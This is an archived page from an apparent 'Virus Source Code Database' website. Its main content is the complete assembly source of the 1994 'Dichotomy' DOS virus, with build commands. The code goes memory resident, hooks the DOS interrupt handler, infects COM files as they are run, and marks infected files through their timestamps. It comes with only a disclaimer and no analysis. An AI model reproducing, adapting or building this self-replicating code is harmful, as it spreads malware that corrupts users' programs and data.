<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: dikotomy_asm</title>
<meta name="KEYWORDS" content="dikotomy.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for dikotomy.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="da_1800_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/da_1800_asm.php">da_1800_asm</a><br>
<a href="da_2000d_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/da_2000d_asm.php">da_2000d_asm</a><br>
<a href="da_2100_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/da_2100_asm.php">da_2100_asm</a><br>
<a href="da'boys__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/da'boys__asm.php">da'boys__asm</a><br>
<a href="da'boys_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/da'boys_asm.php">da'boys_asm</a><br>
<a href="daddy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/daddy_asm.php">daddy_asm</a><br>
<a href="daemaen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/daemaen_asm.php">daemaen_asm</a><br>
<a href="dame_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dame_asm.php">dame_asm</a><br>
<a href="dan_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dan_asm.php">dan_asm</a><br>
<a href="danger_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/danger_asm.php">danger_asm</a><br>
<a href="da_olivr_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/da_olivr_asm.php">da_olivr_asm</a><br>
<a href="dapm2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dapm2_asm.php">dapm2_asm</a><br>
<a href="dark2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dark2_asm.php">dark2_asm</a><br>
<a href="dark3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dark3_asm.php">dark3_asm</a><br>
<a href="darkapoc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darkapoc_asm.php">darkapoc_asm</a><br>
<a href="dark__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dark__asm.php">dark__asm</a><br>
<a href="dark_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dark_asm.php">dark_asm</a><br>
<a href="darkaven_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darkaven_asm.php">darkaven_asm</a><br>
<a href="darkstar_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darkstar_asm.php">darkstar_asm</a><br>
<a href="darlene_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darlene_asm.php">darlene_asm</a><br>
<a href="darth1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth1_asm.php">darth1_asm</a><br>
<a href="darth2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth2_asm.php">darth2_asm</a><br>
<a href="darth3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth3_asm.php">darth3_asm</a><br>
<a href="darth4___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth4___asm.php">darth4___asm</a><br>
<a href="darth4__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth4__asm.php">darth4__asm</a><br>
<a href="darth4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth4_asm.php">darth4_asm</a><br>
<a href="darth_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth_asm.php">darth_asm</a><br>
<a href="das_boot_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/das_boot_asm.php">das_boot_asm</a><br>
<a href="datacrim_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/datacrim_asm.php">datacrim_asm</a><br>
<a href="datalock_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/datalock_asm.php">datalock_asm</a><br>
<a href="datarape_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/datarape_asm.php">datarape_asm</a><br>
<a href="datarp23_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/datarp23_asm.php">datarp23_asm</a><br>
<a href="dav1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dav1_asm.php">dav1_asm</a><br>
<a href="dav_b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dav_b_asm.php">dav_b_asm</a><br>
<a href="dbase_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dbase_asm.php">dbase_asm</a><br>
<a href="dc-b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dc-b_asm.php">dc-b_asm</a><br>
<a href="dcii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dcii_asm.php">dcii_asm</a><br>
<a href="death_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/death_asm.php">death_asm</a><br>
<a href="de'buger_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/de'buger_asm.php">de'buger_asm</a><br>
<a href="decode__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/decode__asm.php">decode__asm</a><br>
<a href="decode_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/decode_asm.php">decode_asm</a><br>
<a href="decom_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/decom_asm.php">decom_asm</a><br>
<a href="define___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/define___asm.php">define___asm</a><br>
<a href="define__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/define__asm.php">define__asm</a><br>
<a href="define_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/define_asm.php">define_asm</a><br>
<a href="defs_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/defs_asm.php">defs_asm</a><br>
<a href="dei_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dei_asm.php">dei_asm</a><br>
<a href="deicide__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/deicide__asm.php">deicide__asm</a><br>
<a href="deicide_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/deicide_asm.php">deicide_asm</a><br>
<a href="deldir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/deldir_asm.php">deldir_asm</a><br>
<a href="demo_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demo_asm.php">demo_asm</a><br>
<a href="demoexe_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demoexe_asm.php">demoexe_asm</a><br>
<a href="demon__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demon__asm.php">demon__asm</a><br>
<a href="demon_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demon_asm.php">demon_asm</a><br>
<a href="demov1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demov1_asm.php">demov1_asm</a><br>
<a href="demov2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demov2_asm.php">demov2_asm</a><br>
<a href="demov3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demov3_asm.php">demov3_asm</a><br>
<a href="demov4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demov4_asm.php">demov4_asm</a><br>
<a href="demov5_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demov5_asm.php">demov5_asm</a><br>
<a href="demovir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demovir_asm.php">demovir_asm</a><br>
<a href="destruct_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/destruct_asm.php">destruct_asm</a><br>
<a href="detect_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/detect_asm.php">detect_asm</a><br>
<a href="devdance_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/devdance_asm.php">devdance_asm</a><br>
<a href="dhog_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dhog_asm.php">dhog_asm</a><br>
<a href="diamond__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/diamond__asm.php">diamond__asm</a><br>
<a href="diamond_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/diamond_asm.php">diamond_asm</a><br>
<a href="diarrhe4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/diarrhe4_asm.php">diarrhe4_asm</a><br>
<a href="diarrhe6_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/diarrhe6_asm.php">diarrhe6_asm</a><br>
<a href="dieloser_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dieloser_pas.php">dieloser_pas</a><br>
<a href="digdeath_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/digdeath_asm.php">digdeath_asm</a><br>
<a href="digipol_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/digipol_asm.php">digipol_asm</a><br>
<a href="dikotomy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dikotomy_asm.php">dikotomy_asm</a><br>
<a href="diogenes_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/diogenes_asm.php">diogenes_asm</a><br>
<a href="dir-2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir-2_asm.php">dir-2_asm</a><br>
<a href="dir2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir2_asm.php">dir2_asm</a><br>
<a href="dir_2d_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir_2d_asm.php">dir_2d_asm</a><br>
<a href="dir_ii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir_ii_asm.php">dir_ii_asm</a><br>
<a href="dir-ii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir-ii_asm.php">dir-ii_asm</a><br>
<a href="dirii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dirii_asm.php">dirii_asm</a><br>
<a href="dir_iii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir_iii_asm.php">dir_iii_asm</a><br>
<a href="dir-vir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir-vir_asm.php">dir-vir_asm</a><br>
<a href="diskkill_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/diskkill_asm.php">diskkill_asm</a><br>
<a href="dissolve_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dissolve_asm.php">dissolve_asm</a><br>
<a href="dj_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dj_asm.php">dj_asm</a><br>
<a href="dkennedy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dkennedy_asm.php">dkennedy_asm</a><br>
<a href="donothin_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/donothin_asm.php">donothin_asm</a><br>
<a href="dontell__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dontell__asm.php">dontell__asm</a><br>
<a href="dontello_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dontello_asm.php">dontello_asm</a><br>
<a href="doodle_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/doodle_asm.php">doodle_asm</a><br>
<a href="doom_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/doom_asm.php">doom_asm</a><br>
<a href="doomsday_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/doomsday_asm.php">doomsday_asm</a><br>
<a href="dos_1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dos_1_asm.php">dos_1_asm</a><br>
<a href="dos-1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dos-1_asm.php">dos-1_asm</a><br>
<a href="dos1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dos1_asm.php">dos1_asm</a><br>
<a href="doteater_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/doteater_asm.php">doteater_asm</a><br>
<a href="dotkill_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dotkill_asm.php">dotkill_asm</a><br>
<a href="dr20-inf_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dr20-inf_asm.php">dr20-inf_asm</a><br>
<a href="dreamer_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dreamer_asm.php">dreamer_asm</a><br>
<a href="dreamwrl_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dreamwrl_asm.php">dreamwrl_asm</a><br>
<a href="droper_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/droper_asm.php">droper_asm</a><br>
<a href="drop_rep_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/drop_rep_asm.php">drop_rep_asm</a><br>
<a href="dropsy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dropsy_asm.php">dropsy_asm</a><br>
<a href="drq-1028_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/drq-1028_asm.php">drq-1028_asm</a><br>
<a href="drq_1161_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/drq_1161_asm.php">drq_1161_asm</a><br>
<a href="drq-1161_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/drq-1161_asm.php">drq-1161_asm</a><br>
<a href="druid_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/druid_asm.php">druid_asm</a><br>
<a href="dsce-gen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dsce-gen_asm.php">dsce-gen_asm</a><br>
<a href="dsmedemo_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dsmedemo_asm.php">dsmedemo_asm</a><br>
<a href="dsme-gen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dsme-gen_asm.php">dsme-gen_asm</a><br>
<a href="dt_251_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dt_251_asm.php">dt_251_asm</a><br>
<a href="dt-251_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dt-251_asm.php">dt-251_asm</a><br>
<a href="dt_310_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dt_310_asm.php">dt_310_asm</a><br>
<a href="dt-310_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dt-310_asm.php">dt-310_asm</a><br>
<a href="dtiny_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dtiny_asm.php">dtiny_asm</a><br>
<a href="dt_kendy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dt_kendy_asm.php">dt_kendy_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

comment #
                          Source code of Dichotomy

                               by Evil Avatar
#

;===<DIKOTOMY.ASM>=========================================================
;
;       Dichotomy Virus
;       (c) 1994 Evil Avatar
;
; TASM /M3 DIKOTOMY
; TLINK /X DIKOTOMY
; EXE2BIN DIKOTOMY DIKOTOMY.COM

.model tiny
.code
org 0

;=====( Entry point for COM files )========================================

Dichotomy:
          call delta
delta:    mov bx, sp
          mov bp, word ptr ds:[bx]
          sub bp, offset delta          ;get delta offset
          inc sp
          inc sp
          cmp word ptr ds:[bp+virus1], 'D['
          mov ah, 1ah
          lea dx, [bp+newDTA]           ;buffer for new DTA
          int 21h                       ;set new disk transfer address
          mov ah, 4eh
          mov cx, 7                     ;any attribute
          lea dx, [bp+FileName]         ;host name
          int 21h                       ;find second host file
          jc maybe_host                 ;if carry, then we need a new host
          mov ax, 3d00h
          int 21h                       ;open second host
          xchg ax, bx                   ;handle is better in bx
          mov ax, 4200h
          sub cx, cx
          mov dx, word ptr ds:[bp+newDTA+1ah]
          sub dx, (offset heap-offset loader2)
          int 21h                       ;move pointer to virus code
          mov ah, 3fh
          mov cx, (offset heap-offset loader2)
          lea dx, [bp+loader2]
          int 21h                       ;read in second part of virus
          mov ah, 3eh
          int 21h                       ;close the file
maybe_host:
          mov ah, 51h
          int 21h                       ;check if resident
          inc bx                        ;if resident, PSP should be -1
          jz resident                   ;yes? kewl!
          cmp word ptr ds:[bp+virus1], 'D['     ;check if we are fully here
          je go_res                     ;yes? we need to go resident
return:   mov ah, 1ah
          mov dx, 80h
          int 21h                       ;restore DTA
          lea si, [bp+comfix]           ;offset of first 3 bytes of file
          mov di, 100h                  ;start of .com file
          mov ax, di
          push ax
          movsw
          movsb
          retn
resident: cmp word ptr ds:[bp+virus1], 'D['     ;is the second host here?
          je return                     ;yes? return to program
          mov ah, 62h
          int 21h                       ;request new host
          jmp return                    ;return to host
go_res:   jmp loader2                   ;go memory resident

;=====( Variables )========================================================

comfix    db 0cdh, 20h, 0               ;first 3 bytes of .com file
virus     db '[Dichotomy]', 0           ;virus name
author    db '(c) 1994 Evil Avatar', 0  ;me
FileName  db 'DIKOTOMY.COM', 0, 73h dup (?)     ;second host name
loader1_end:

;=====( Go memory resident )===============================================

loader2:
          mov byte ptr ds:[bp+count], 0 ;infections = 0
          mov ah, 'E'
          xor ah, 0fh
          mov bx, -1
          int 21h                       ;get available memory
          mov ah, 'A'
          xor ah, 0bh
          sub bx, (virus_end-Dichotomy+15)/16+1
          int 21h                       ;create a hole in memory
          mov ax, 3521h
          int 21h                       ;get int 21h handler
          mov word ptr [bp+save21], bx
          mov word ptr [bp+save21+2], es        ;save int 21h vector
          mov ah, 'E'
          xor ah, 0dh
          mov bx, (virus_end-Dichotomy+15)/16
          int 21h                       ;allocate the memory
          mov es, ax                    ;es is high virus segment
          mov cx, (virus_end-Dichotomy+1)/2
          lea si, [bp+Dichotomy]
          sub di, di
          rep movsw                     ;copy ourself up there
          push es
          pop ds                        ;save virus seg for int 21h change
          dec ax                        ;MCB segment
          mov es, ax
          mov word ptr es:[1], 8        ;make DOS the owner of our segment
          mov ax, 4541h
          sub ax, 2020h
          lea dx, [int21]
          int 21h                       ;set new int 21h handler
          push cs cs
          pop ds es                     ;restore PSP segments
          jmp return                    ;return to host

;=====( Find a new host )==================================================

request:  push ds di si cx cs
          pop ds                        ;save registers
          mov di, bp                    ;set up scan registers
          sub si, si
          mov cx, 5
          repe cmpsw                    ;scan to see if it is us
          jne restore1                  ;no? let dos take care of it
          mov ax, 4300h
          lea dx, [WhatRun]
          int 21h                       ;get attributes of file
          push cx                       ;save them
          mov ax, 4301h
          sub cx, cx
          int 21h                       ;clear attributes
          mov ax, 3d02h
          int 21h                       ;open file read/write
          xchg ax, bx
          mov ax, 5700h
          int 21h                       ;get file date/time
          and cx, 1fh                   ;get seconds
          cmp cx, 1fh                   ;is it 62?
          je cant_fix                   ;can't fix this file
          mov ax, 4202h
          sub cx, cx
          cwd
          int 21h                       ;go to end of file
          mov ah, 40h
          mov cx, (heap-loader2)
          lea dx, [loader2]
          int 21h                       ;copy to end of file
          mov ax, 5700h
          int 21h                       ;get file date/time
          or cx, 1fh
          mov ax, 5701h
          int 21h
cant_fix: mov ax, 4301h
          pop cx                        ;get attributes
          int 21h                       ;restore attributes
          mov ah, 3eh
          int 21h                       ;close file
restore1: pop cx si di ds               ;restore registers
          jmp dos21                     ;go to dos

;=====( Interrupt 21h handler )============================================

int21:    inc ah
          cmp ah, 4ch                   ;execute file
          je infect                     ;infect it
          dec ah
          cmp ah, 51h                   ;install check
          je install_check
          cmp ah, 62h                   ;request for new host
          je _request
dos21:    jmp dword ptr cs:[save21]     ;call dos
_request: jmp request

;=====( Installation check )===============================================

install_check:
          push di si cx ds cs
          pop ds                        ;save registers
          mov di, bp                    ;set up scan registers
          sub si, si
          mov cx, 5
          repe cmpsw                    ;scan to see if it is us
          jne restore                   ;no? let dos take care of it
          mov bx, -1                    ;return code
          pop ds                        ;restore ds
          add sp, 6                     ;fix stack
          iret                          ;return
restore:  pop cx si di ds               ;restore registers
          jmp dos21                     ;go to dos

;=====( Infection routine )================================================

infect:   dec ah
          call push_all                 ;save registers
          push cs
          pop es                        ;es equals code segment
          mov si, dx
          lea di, [WhatRun]
          mov cx, 40h
          rep movsw                     ;save filename in buffer
          mov si, dx                    ;ds:si equals file name
          lea di, [FileName]
          mov ax, 4300h
          int 21h                       ;get attributes of file
          push cx                       ;save them
          mov ax, 4301h
          sub cx, cx
          int 21h                       ;clear attributes
          mov ax, 3d02h
          int 21h                       ;open file read/write
          xchg ax, bx                   ;put handle in bx
          mov ax, 5700h
          int 21h                       ;get file time/date
          and cx, 1fh                   ;get seconds
          cmp cx, 1eh                   ;is 60 or 62?
          jae already_inf               ;then already infected
          lodsb                         ;get drive letter
          dec si                        ;point to filename again
          and al, 5fh                   ;make it uppercase
          cmp al, 'C'                   ;is it C or higher?
          jb _single                    ;no? we must fully infect it
          cmp byte ptr cs:[count], 1    ;have we already done loader 2?
          jne do_loader2                ;yes? start doing loader 1s
do_loader1:
          call inf_loader1
          jmp done_inf
do_loader2:          
          call inf_loader2
          jmp done_inf
_single:  push si di
          mov cx, 40h
          rep movsw                     ;save filename in buffer
          pop di si
          call inf_loader1
          call inf_loader2
          mov byte ptr cs:[count], 0
done_inf: mov ah, 3eh
          int 21h                       ;close file
already_inf:
          mov ax, 4301h
          pop cx                        ;get attributes
          int 21h                       ;restore attributes
          call pop_all                  ;restore registers
          jmp dos21                     ;call dos

;=====( Infect file with loader 1 )========================================

inf_loader1:
          push si di ds dx cs           ;save filename and other stuff
          pop ds
          mov byte ptr ds:[count], 0    ;do loader 2 from now on
          mov ah, 3fh
          mov cx, 3
          lea dx, [comfix]
          int 21h                       ;read in first 3 bytes
          mov ax, 4202h
          sub cx, cx
          cwd
          int 21h                       ;go to end of file
          or dx, dx
          jnz bad_file
          cmp ax, 65024-(virus_end-Dichotomy)   ;see if file is too big
          jae bad_file
          mov cx, word ptr ds:[comfix]
          cmp cx, 'M'+'Z'
          jz bad_file                   ;can't infect .exe's
          sub ax, 3                     ;calculate jump
          mov word ptr ds:[buffer], ax  ;set up jump
          mov ah, 40h
          mov cx, (loader1_end-Dichotomy)
          cwd
          int 21h                       ;copy virus to end of file
          mov ax, 4200h
          sub cx, cx
          cwd
          int 21h                       ;go to beginning of file
          mov ah, 40h
          mov cx, 3
          lea dx, [buffer-1]
          int 21h                       ;copy jump to beginning
          mov ax, 5700h
          int 21h                       ;get file time/date
          mov ax, 5701h
          or cx, 1eh
          and cx, 0fffeh                ;set to 60 seconds
          int 21h                       ;set new file time
bad_file: pop dx ds di si
          retn

;=====( Infect file with loader 2 )========================================

inf_loader2:
          push ds dx                    ;save file name
          mov cx, 40h
          rep movsw                     ;save filename in buffer
          push cs
          pop ds                        ;ds needs to be code segment
          mov byte ptr ds:[count], 1    ;do loader 1 from now on
          mov ax, 4202h
          sub cx, cx
          cwd
          int 21h                       ;go to end of file
          mov ah, 40h
          mov cx, (heap-loader2)
          lea dx, [loader2]
          int 21h                       ;copy to end of file
          mov ax, 5700h
          int 21h                       ;get file date/time
          or cx, 1fh                    ;set to 62 seconds
          mov ax, 5701h
          int 21h                       ;set new file time
          pop dx ds                     ;restore file name
          retn                          ;return to caller

;=====( Push all registers )===============================================

push_all: pop word ptr cs:[p_all]       ;save return code
          push ax bx cx dx bp si di ds es       ;save registers
          pushf                         ;save flags
          jmp word ptr cs:[p_all]       ;return to caller

;=====( Pop all registers )================================================

pop_all:  pop word ptr cs:[p_all]       ;save return code
          popf                          ;restore flags
          pop es ds di si bp dx cx bx ax        ;restore registers
          jmp word ptr cs:[p_all]       ;return to caller

;=====( More variables )===================================================

virus1    db '[Dichotomy]', 0           ;virus signature
          db 0e9h                       ;jump cs:xxxx
heap:
buffer    dw ?                          ;jump buffer
newDTA    db 2bh dup (?)                ;replacement disk transfer address
save21    dd ?                          ;interrupt 21h vector
p_all     dw ?                          ;push/pop return value
count     db ?                          ;infection count
WhatRun   db 80h dup (?)
virus_end:
end Dichotomy

</textarea></td></tr></table></body></html>
